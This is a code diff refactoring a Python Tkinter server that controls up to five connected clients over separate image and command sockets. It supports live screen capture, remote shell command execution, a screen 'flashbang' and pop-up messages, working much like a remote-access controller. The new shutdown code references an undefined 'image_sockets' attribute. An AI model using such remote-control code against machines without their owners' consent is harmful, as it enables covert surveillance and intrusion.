@@ -18,17 +18,27 @@ client_labels = [None] * 5
 connectionNumThing = str(connectionsNum) + " Connections!"
 client_sockets = [None] * 5
 class ScreenSharingServer:
-    def __init__(self, master, host='0.0.0.0', port=5001):
+    def __init__(self, master, host='0.0.0.0', image_port=5001, command_port=5002):
         self.master = master
         self.host = host
-        self.port = port
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_socket.bind((host, port))
-        self.server_socket.listen(5)
+        self.image_port = image_port
+        self.command_port = command_port
+        self.image_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.command_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
+        # Image server socket setup
+        self.image_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.image_server_socket.bind((host, image_port))
+        self.image_server_socket.listen(5)
+        
+        # Command server socket setup
+        self.command_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.command_server_socket.bind((host, command_port))
+        self.command_server_socket.listen(5)
+
         self.clients = [None] * 5
         self.client_sockets = [None] * 5
+        self.command_sockets = [None] * 5
         self.client_labels = [None] * 5
         self.connectionNumThing = str(connectionsNum) + " Connections!"
         self.current_client = 0
@@ -51,11 +61,11 @@ class ScreenSharingServer:
         # General Commands tab
         self.flashbangLabel = objTTK.Label(objSettingsTab5, text="FLASHBANG! the client!", font=normalFont)
         self.flashbangLabel.place(x=20, y=20)
-        self.flashBang = objTTK.Button(objSettingsTab5, text="FLASHBANG!", command=self.flashbang)
+        self.flashBang = objTTK.Button(objSettingsTab5, text="FLASHBANG!", command=self.trigger_flashbang)
         self.flashBang.place(x=30, y=50)
         self.messageTheClientLabel = objTTK.Label(objSettingsTab5, text="Message the Client!", font=normalFont)
         self.messageTheClientLabel.place(x=20, y=100)
-        self.messageTheClientButton = objTTK.Button(objSettingsTab5, text="Message!", command=self.messageTheClient)
+        self.messageTheClientButton = objTTK.Button(objSettingsTab5, text="Message!", command=self.message_client)
         self.messageTheClientButton.place(x=30, y=130)
         self.screenShareLabelButton = objTTK.Label(objSettingsTab5, text="Screenshare Control!", font=normalFont)
         self.screenShareLabelButton.place(x=20, y=180)
@@ -68,27 +78,22 @@ class ScreenSharingServer:
 
     def wait_for_connection(self):
         threading.Thread(target=self.accept_connection).start()
-    def flashbang(self):
-        clientToFlashbang = objDialog.askinteger(title="FLASHBANG!", prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4")
-        client_socket_Selec = self.client_sockets[clientToFlashbang]
-        if client_socket_Selec is not None:
-            client_socket_Selec.send("flashbang".encode('utf-8'))
-    def messageTheClient(self):
-        clientToMessage = objDialog.askinteger(title="Message the Client!", prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4")
-        client_socket_Selec = self.client_sockets[clientToMessage]
-        if client_socket_Selec is not None:
-            message = objDialog.askstring(title="Message the Client!", prompt="Enter the message to send!")
-            messageToSend = f"message{message}"
-            client_socket_Selec.send(messageToSend.encode('utf-8'))
+
     def accept_connection(self):
         global connectionsNum
         print("Waiting for a connection...")
         try:
             while True:
-                client_socket, address = self.server_socket.accept()
-                print(f"Connection from {address} has been established!")
-                # Receive client info
-                client_info = client_socket.recv(1024).decode('utf-8')
+                # Accept command socket connection
+                command_socket, address = self.command_server_socket.accept()
+                print(f"Command connection from {address} has been established!")
+                
+                # Accept image socket connection
+                image_socket, _ = self.image_server_socket.accept()
+                print(f"Image connection from {address} has been established!")
+                
+                # Receive client info from command socket
+                client_info = command_socket.recv(1024).decode('utf-8')
                 client_info = ast.literal_eval(client_info)
                 
                 for i in range(5):
@@ -96,32 +101,42 @@ class ScreenSharingServer:
                         self.client_infos[i] = client_info
                         break
                 
-                self.update_info_display()  # Update the text box with the first client's info
-                client_socket.send("received".encode('utf-8'))
+                self.update_info_display()
+                command_socket.send("received".encode('utf-8'))
                 
-                # Find an empty slot for the client
                 empty_slot = None
-                ipv6 = "no ipv6?"
-                for addr_info in socket.getaddrinfo(address[0], None):
-                    if addr_info[0] == socket.AF_INET6:
-                        ipv6 = addr_info[4][0]
-                        break
                 for i in range(5):
                     if self.client_sockets[i] is None or self.clients[i] == "Client Disconnected":
                         empty_slot = i
                         break
+                
                 if empty_slot is not None:
                     self.clients[empty_slot] = address[0]
-                    self.client_sockets[empty_slot] = client_socket
+                    self.client_sockets[empty_slot] = image_socket
+                    self.command_sockets[empty_slot] = command_socket
                     connectionsNum += 1
-                    self.update_client_labels(empty_slot, address[0], ipv6, connectionsNum)  # Update client label
-                    threading.Thread(target=self.receive_images, args=(client_socket, empty_slot)).start()
+                    self.update_client_labels(empty_slot, address[0], "No IPv6", connectionsNum)
+                    threading.Thread(target=self.receive_images, args=(image_socket, empty_slot)).start()
                 else:
                     print("No available slots for new connections.")
         except OSError as e:
-            if str(e) != "[WinError 10038] An operation was attempted on something that is not a socket":
-                print(f"Error: {e}")
-                self.disconnect()
+            print(f"Error: {e}")
+            self.disconnect()
+
+
+    def trigger_flashbang(self):
+        clientToFlashbang = objDialog.askinteger(title="FLASHBANG!", prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4")
+        client_socket_Selec = self.command_sockets[clientToFlashbang]
+        if client_socket_Selec is not None:
+            client_socket_Selec.send("flashbang".encode('utf-8'))
+
+    def message_client(self):
+        clientToMessage = objDialog.askinteger(title="Message the Client!", prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4")
+        client_socket_Selec = self.command_sockets[clientToMessage]
+        if client_socket_Selec is not None:
+            message = objDialog.askstring(title="Message the Client!", prompt="Enter the message to send!")
+            messageToSend = f"message{message}"
+            client_socket_Selec.send(messageToSend.encode('utf-8'))
 
     def receive_images(self, client_socket, index):
         try:
@@ -236,11 +251,11 @@ class ScreenSharingServer:
     def startScreenShare(self):
         clientToStartScreenShare = objDialog.askinteger(title="Screenshare Start!", prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4")
         if clientToStartScreenShare is not None:
-            self.client_sockets[clientToStartScreenShare].send("start_screenshare".encode('utf-8'))
+            self.command_sockets[clientToStartScreenShare].send("start_screenshare".encode('utf-8'))
     def stopScreenShare(self):
         clientToStopScreenShare = objDialog.askinteger(title="Screenshare Stop!", prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4")
         if clientToStopScreenShare is not None:
-            self.client_sockets[clientToStopScreenShare].send("stop_screenshare".encode('utf-8'))
+            self.command_sockets[clientToStopScreenShare].send("stop_screenshare".encode('utf-8'))
 
 try:
     ctypes.windll.shcore.SetProcessDpiAwareness(1)
@@ -255,10 +270,11 @@ if sys.platform == 'win32':
     root.iconbitmap('test/Images/icon.ico') 
 path = "test/Fonts/font.ttf"
 path2 = "test/Fonts/font2.ttf"
+path3 = "test/Fonts/font3.otf"
 
 normalFont = Font(file=path, family="Montserrat", size=10)
-smallFont = Font(file=path2, family="Josefin Slab", size=8)
-joseFont = Font(family="Josefin Slab", size=10)
+smallFont = Font(file=path3, family="Cascadia Mono Light", size=6)
+terminalFont = Font(family="Cascadia Mono Light", size=8)
 boldFont = Font(family="Montserrat Semibold", size=20)
 lightFont = Font(family="Montserrat Light", size=10)
 
@@ -356,7 +372,7 @@ connections5_label.place(x=40, y=290)
 clientInfoFrame = objTK.Frame(objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0)
 clientInfoFrame.place(x=382,y=5, width=500, height=440)
 
-clientInfoFrameText = objTK.Text(clientInfoFrame, font=joseFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=5, pady=5)
+clientInfoFrameText = objTK.Text(clientInfoFrame, font=terminalFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=5, pady=5)
 clientInfoFrameText.place(x=0,y=0, width=500, height=440)
 # Remote CMD tab
 class CustomCommandPrompt:
@@ -364,7 +380,7 @@ class CustomCommandPrompt:
         self.frame = objTK.Frame(master, bg="#252525", bd=2, highlightthickness=0, borderwidth=0)
         self.frame.place(relx=0.5, rely=0.5, anchor=objTK.CENTER, width=870, height=525)
 
-        self.output_text = objTK.Text(self.frame, font=smallFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=15, pady=15)
+        self.output_text = objTK.Text(self.frame, font=terminalFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=15, pady=15)
         self.output_text.place(relwidth=1, relheight=0.929)
         
         self.command_entry = objTTK.Entry(self.frame, font=smallFont)
@@ -375,28 +391,18 @@ class CustomCommandPrompt:
         index = 0
         command = self.command_entry.get()
         cmdSend = "CMD" + command
-        input = server.client_sockets[index].send(cmdSend.encode('utf-8'))
-        response = server.client_sockets[index].recv(1024)
-        attempts = 20
-        while True:
-            try:
-                response_text = response.decode('utf-8')
-                if response_text.startswith("CMDOUTPUT"):
-                    server.client_sockets[index].send("received".encode('utf-8'))
-                    print_output = response_text[9:]
-                    self.output_text.insert(objTK.END, f"$ {command}\n")
-                    self.output_text.insert(objTK.END, f"{print_output}\n")
-                    attempts = 20
-                    break
-            except UnicodeDecodeError:
-                attempts -= 1
-                if attempts != 0:
-                    continue
-                else:
-                    print("Failed to receive command output after multiple attempts.")
-                    server.client_sockets[index].send("not received".encode('utf-8'))
-                    attempts = 20
-                    continue
+        input = server.command_sockets[index].send(cmdSend.encode('utf-8'))
+        response = server.command_sockets[index].recv(1024)
+        try:
+            response_text = response.decode('utf-8')
+            if response_text.startswith("CMDOUTPUT"):
+                self.output_text.config(state="normal")
+                print_output = response_text[9:]
+                self.output_text.insert(objTK.END, f"$ {command}\n")
+                self.output_text.insert(objTK.END, f"{print_output}\n")
+        except UnicodeDecodeError:
+            print("shit")
+            return
         self.command_entry.delete(0, objTK.END)
         self.output_text.config(state="disabled")
         self.output_text.yview_moveto(1.0)
@@ -420,20 +426,24 @@ lb5.place(x=5, y=5)
 def center_widget(widget):
     widget.place(relx=0.5, rely=0.5, anchor="center")
 
+import ctypes
+
 def shutDown():
     if objMessageBox.askyesno(title="WARNING", message="Are you sure you want to shut down? This will close the connection between the client and the server. You will not be able to reconnect unless the client program is opened manually along with the server."):
         if objMessageBox.askyesno(title="LAST WARNING", message="Are you really sure?!"):
-            if server.server_socket is not None:
-                server.server_socket.close()
-            if server.is_screen_sharing:
-                server.is_screen_sharing = False
-            if server.client_sockets != [None]:
-                try:
-                    for sock in server.client_sockets:
-                        if sock is not None:
-                            sock.close()
-                except Exception as e:
-                    print(f"Error while closing client sockets: {e}")
+            # Close all sockets
+            for sock in server.command_sockets:
+                if sock:
+                    try:
+                        sock.close()
+                    except Exception as e:
+                        print(f"Error closing command socket: {e}")
+            for sock in server.image_sockets:
+                if sock:
+                    try:
+                        sock.close()
+                    except Exception as e:
+                        print(f"Error closing image socket: {e}")
             server.disconnect()
             stop_all_threads()
             root.destroy()
@@ -448,6 +458,7 @@ def stop_all_threads():
                 )
             except Exception as e:
                 print(f"Error while stopping thread {thread.name}: {e}")
+
 
 center_widget(tabControl)
 
